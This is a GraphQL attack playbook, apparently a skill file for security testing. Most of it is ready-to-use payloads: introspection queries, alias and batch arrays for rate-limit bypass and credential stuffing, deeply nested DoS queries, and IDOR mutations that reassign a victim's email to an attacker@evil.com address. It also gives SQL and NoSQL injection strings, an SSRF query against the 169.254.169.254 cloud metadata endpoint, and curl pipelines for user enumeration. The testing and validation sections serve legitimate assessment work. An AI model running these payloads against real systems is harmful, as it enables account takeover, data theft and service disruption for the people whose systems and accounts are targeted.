---
name: graphql_attacks
description: GraphQL API security testing including introspection abuse, batching, nested query DoS, alias bypass, and mutation IDOR
---

# GraphQL Attacks

GraphQL APIs expose a strongly-typed schema that attackers can fully enumerate via introspection. Beyond information disclosure, GraphQL enables unique attack vectors: query batching to bypass rate limits, deeply nested queries for DoS, alias-based enumeration and authorization bypass, and IDOR in mutations. Treat every GraphQL endpoint as a recon goldmine until the schema is locked down.

## Attack Surface

**Scope**
- Public and authenticated GraphQL endpoints (`/graphql`, `/api/graphql`, `/gql`, `/v1/graphql`)
- Subscription endpoints (WebSocket: `wss://TARGET/graphql`)
- Persisted query endpoints (`/graphql?documentId=123`)
- GraphQL-Over-HTTP (GET with `query=` parameter)
- GraphQL IDEs exposed in production: GraphiQL, Playground, Altair, GraphQL Explorer

**Discovery**
- Common paths: `/graphql`, `/graphiql`, `/playground`, `/altair`, `/v1/graphiql`, `/api/graphql`
- HTTP POST to common paths with `{__schema{types{name}}}` — 200 response with data confirms endpoint
- Check for GraphQL in JavaScript bundles: search for `graphql-tag`, `gql\``, `useQuery`, `ApolloClient`
- Look for `application/graphql` content-type or `query=` in GET parameters

**Schema Reconnaissance**
- Full introspection: `{__schema{queryType{name}mutationType{name}subscriptionType{name}types{name kind fields{name type{name kind ofType{name kind}}}}}}`
- Field-level introspection when full introspection is blocked: `{__type(name:"User"){fields{name type{name}}}}`
- Enumerate types one at a time by guessing type names from API responses or JS bundles

## High-Value Targets

- User/account management mutations (create, update, delete, role changes)
- File upload mutations (often bypass REST upload restrictions)
- Payment/billing mutations (apply coupons, change plans, transfer credits)
- Admin-only types/fields visible through introspection but gated by resolver auth
- Nested relationships: `user → organization → members → apiKeys`
- Subscription endpoints exposing real-time data streams

## Key Vulnerabilities

### Introspection Abuse

**Full Schema Disclosure**

```graphql
# Full introspection — reveals ALL types, fields, enums, deprecations
{
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      fields {
        name
        args { name type { name kind ofType { name } } }
        type { name kind ofType { name kind ofType { name } } }
      }
      enumValues { name }
      inputFields { name type { name } }
    }
    directives { name locations args { name type { name } } }
  }
}
```

**Partial Introspection (when full is blocked)**

```graphql
# Probe specific types by name — no __schema needed
{ __type(name: "User") { fields { name type { name kind ofType { name } } } } }
{ __type(name: "AdminQuery") { fields { name } } }
{ __type(name: "Mutation") { fields { name } } }

# Enumerate via __typename on objects
{ users(first:1) { __typename id } }
```

**Introspection Bypasses**
- `GET` requests sometimes bypass introspection blocking applied to `POST`
- Persisted queries (`extensions.persistedQuery`) may still load full schema
- Schema may be blocked but SDL endpoint exposed: `/graphql?SDL`, `__schema { description }` not blocked
- GraphQL-WS subscriptions may have different introspection policy

### Query Batching & Alias Bypass

**Alias-Based Enumeration (bypass rate limits)**

```graphql
# Brute-force user emails 100x per request using aliases
{
  u1: user(email: "admin@target.com") { id role }
  u2: user(email: "root@target.com") { id role }
  u3: user(email: "info@target.com") { id role }
  # ... up to 100+ aliases per request
}
```

**Alias-Based Auth Bypass**

```graphql
# Access another user's data by mixing queries
{
  me { id email }
  target: user(id: "VXNlcjo0NTY=") { email ssn creditCard { last4 } }
  another: node(id: "VXNlcjo0NTc=") { ... on User { email } }
}
```

**Operation Batching (array of operations)**

```json
[
  { "query": "mutation { login(email:\"victim1@t.com\", password:\"password1\") { token } }" },
  { "query": "mutation { login(email:\"victim2@t.com\", password:\"password2\") { token } }" },
  { "query": "mutation { login(email:\"victim3@t.com\", password:\"password3\") { token } }" }
]
```

**GET-Based Batching**

```bash
# Bypass POST-only rate limiting by sending query via GET
curl "https://TARGET/graphql?query={user(email:%22admin@t.com%22){id,email,passwordHash}}"
```

### Nested Query DoS

**Deep Nesting (query depth attack)**

```graphql
# Exploit circular references for exponential server load
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              friends {
                friends {
                  friends {
                    id name email
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

**Field Duplication (query width attack)**

```graphql
{
  user(id: 1) {
    email
    a1: posts { title content author { email } }
    a2: posts { title content author { email } }
    a3: posts { title content author { email } }
    # ... hundreds of aliases
  }
}
```

**Fragment Spread Amplification**

```graphql
fragment UserFields on User {
  a1: posts { author { posts { author { email } } } }
  a2: posts { author { posts { author { email } } } }
  a3: posts { author { posts { author { email } } } }
  a4: posts { author { posts { author { email } } } }
}
{ user(id:1) { ...UserFields } }
```

### Mutation IDOR & Authorization Bypass

**Object ID Swapping in Mutations**

```graphql
# Change another user's email/password/address
mutation {
  updateUser(input: { id: "VXNlcjo0NTY=", email: "attacker@evil.com" }) {
    id email
  }
}

# Delete another user's resource
mutation {
  deleteOrder(orderId: "order-789") { success }
}
```

**Relay Global ID Abuse**

```graphql
# Decode base64 global IDs: "VXNlcjo0NTY=" → "User:456"
# Swap type or numeric ID
mutation {
  updateNode(input: {
    id: "VXNlcjo5OTk="    # User:999 — different user
    clientMutationId: "exploit"
  }) { ... on User { email } }
}
```

**Field-Level Authorization Bypass**

```graphql
# Resolver may authorize at object level but not field level
{
  user(id: "targetUserId") {
    id
    email            # might be restricted
    ssn              # definitely restricted
    apiKeys { key }  # restricted
    auditLogs { ip address action }
  }
}
```

### Subscription Abuse

```graphql
# Subscribe to events meant for other users
subscription {
  onNewMessage(userId: "otherUser456") {
    id content from { email }
  }
}

# Subscribe to admin audit events
subscription {
  onSecurityEvent {
    type ip user { email role }
  }
}
```

### Injection via GraphQL

```graphql
# SQL injection in resolver arguments
{ user(name: "admin' OR '1'='1") { id email } }

# NoSQL injection (MongoDB-style)
mutation { login(email: "admin@t.com", password: {"$gt":""}) { token } }

# SSRF via URL arguments in resolvers
{ previewUrl(url: "http://169.254.169.254/latest/meta-data/") { title content } }
```

## Tools

**Schema Extraction & Analysis**

```bash
# graphql-cop — automated GraphQL vulnerability scanner
graphql-cop -t https://TARGET/graphql

# clairvoyance — brute-force schema when introspection is disabled
clairvoyance -t https://TARGET/graphql -w /usr/share/seclists/Discovery/Web-Content/graphql.txt -o schema.json

# graphql-path-enum — find paths between types
graphql-path-enum -s schema.json -f User -t AdminRole

# graphql-playground-patcher — replay queries from captured playground sessions
```

**Batching & Brute Force**

```bash
# graphql-cop tests batching
graphql-cop -t https://TARGET/graphql --include-batching

# Manual alias brute force (user enumeration)
python3 -c "
names = open('/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt').readlines()[:100]
aliases = ', '.join([f'u{i}: user(email: \"{n.strip()}@target.com\") {{ id email }}' for i,n in enumerate(names)])
print(f'{{ {aliases} }}')" | curl -X POST https://TARGET/graphql -H 'Content-Type: application/json' -d @-

# Batch credential stuffing via array-of-operations
cat <<'EOF' | curl -X POST https://TARGET/graphql -H 'Content-Type: application/json' -d @-
[
  {"query":"mutation{login(email:\"user1@t.com\",pass:\"pass1\"){token}}"},
  {"query":"mutation{login(email:\"user2@t.com\",pass:\"pass2\"){token}}"}
]
EOF
```

**Automated Testing**

```bash
# InQL Burp Extension — generates all queries/mutations from introspection
# Also available as standalone:
python3 -m inql -t https://TARGET/graphql

# graphqlmap — interactive exploitation
python3 graphqlmap.py -t https://TARGET/graphql

# Batchql — GraphQL security testing
python3 batchql.py --endpoint https://TARGET/graphql --introspection

# Burp Suite GraphQL extensions:
# - GraphQL Raider (manual testing)
# - GraphQL Cop (automated scanning)
# - InQL (schema visualization + query generation)
```

## Bypass Techniques

**Introspection Blocking**
- Use wordlists to brute-force type/field names: `clairvoyance` tool
- Extract schema from client JS bundles (Apollo Client, Relay, urql)
- Try GET-based introspection: `GET /graphql?query={__schema{types{name}}}`
- Check if `__type(name:"X")` works when `__schema` is blocked
- Look for documentation endpoints: `/graphql-docs`, `/voyager`, `/docs`

**Rate Limiting Bypass**
- Use aliases to pack hundreds of operations in a single query
- Use operation batching (array of queries in one HTTP request)
- Switch between GET/POST/WebSocket transports
- Use persisted query endpoints with manipulated document IDs

**Depth/Complexity Limits**
- Use fragments to flatten deeply nested structures
- Break deep queries into multiple shallower requests
- Try `@defer` and `@stream` directives (may bypass query cost analysis)

**Field Authorization Bypass**
- Request fields via fragments on interface/union types
- Use inline fragments: `{ ... on AdminUser { secretField } }`
- Try aliasing sensitive fields: `a1: email, a2: ssn, a3: passwordHash`

## Chaining Attacks

- GraphQL introspection → discover admin mutations → IDOR in `updateUser` → privilege escalation
- GraphQL batching → rate limit bypass → credential stuffing → account takeover
- Nested query DoS → service degradation → competitive advantage / extortion
- Subscription abuse → real-time data exfiltration → GDPR/privacy violation
- GraphQL SSRF → cloud metadata → AWS keys → S3 bucket takeover
- Alias enumeration → user enumeration → targeted phishing → credential reuse

## Testing Methodology

1. **Discover endpoint** — Probe common paths with `{__typename}`; check JS bundles, server headers, error messages
2. **Introspect** — Full `__schema` query first; if blocked, try `__type(name:)` and client-side JS extraction
3. **Map attack surface** — Catalog all queries, mutations, subscriptions; note types, arguments, return fields
4. **Test batching** — Send array-of-operations and alias-based queries; verify rate limit effectiveness
5. **Test nesting limits** — Send progressively deeper queries; identify depth limits or lack thereof
6. **Auth testing** — Swap object IDs in mutations, request other users' fields, test field-level auth
7. **Injection testing** — Each resolver argument is a potential injection point (SQL, NoSQL, LDAP, SSRF)
8. **Subscription testing** — Subscribe to channels/topics belonging to other users or admin events

## Validation

1. Prove schema disclosure: reproduce introspection output showing sensitive types (AdminMutation, InternalQuery)
2. Demonstrate batching bypass: show rate-limited single request fails but batched alias/array succeeds
3. Show DoS potential: query causing >10x response time/size vs normal queries
4. Confirm IDOR in mutation: demonstrate unauthorized object modification across user boundaries
5. Document injection: resolver argument executing attacker-controlled input (SQL error, OAST callback, data leak)
6. Provide reproducible query strings and expected vs actual responses

## False Positives

- Introspection enabled but schema contains only public/non-sensitive types
- Aliased queries that hit the same authorization checks as sequential queries
- Depth limits properly enforced (queries rejected before execution)
- Subscription channels properly scoped to authenticated user
- `__typename` field returning generic types — not an introspection bypass
- Batching disabled at the server layer (only first operation in array processed)

## Impact

- Full schema disclosure revealing internal data model, hidden fields, admin operations
- Rate limit defeat enabling credential stuffing, brute force, enumeration at scale
- Denial of service via deeply nested or aliased queries consuming excessive CPU/memory
- Authorization bypass exposing PII/PHI/PCI data across user boundaries
- Real-time data exfiltration via subscription abuse
- Injection (SQL, NoSQL, SSRF) through resolver arguments

## CVSS Scoring

| Scenario | CVSS 3.1 | Vector |
|----------|----------|--------|
| Full introspection with admin mutation discovery | 5.3 | AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N |
| Batching rate limit bypass → credential stuffing | 7.5 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |
| Nested query DoS (no depth limit) | 7.5 | AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H |
| Mutation IDOR (cross-account data modification) | 8.1 | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N |
| SQL injection via resolver argument | 9.8 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| Subscription data leak (cross-user) | 7.5 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |

## Pro Tips

1. Always run introspection first — even if it returns nothing, the error message reveals framework info
2. Use `clairvoyance` when introspection is blocked — it brute-forces type and field names using server error messages
3. Check for GraphQL in GET parameters — many WAFs only inspect POST bodies
4. Aliases are your best friend: 100 user lookups per request bypasses any per-request rate limit
5. Test subscriptions separately — they often have different auth middleware than queries/mutations
6. Look for `extensions.persistedQuery` support — persisted query IDs may bypass introspection restrictions
7. In Relay-style APIs, decode all base64 IDs — they contain predictable `TypeName:NumericId` format
8. Fragment-based field access bypasses naive field-level blocks: `... on User { adminField }`
9. Check the `extensions` and `variables` parameters — they are often not logged or rate-limited
10. Use Burp's Repeater with GraphQL tab to quickly modify and replay queries while testing auth boundaries

## Summary

GraphQL gives attackers a self-documenting API with predictable attack surfaces. Introspection reveals the full data model, batching bypasses rate limits, nested queries cause DoS, and resolver-level auth gaps enable IDOR. Test every resolver argument for injection and every object reference for authorization — GraphQL makes the attack surface explicit.
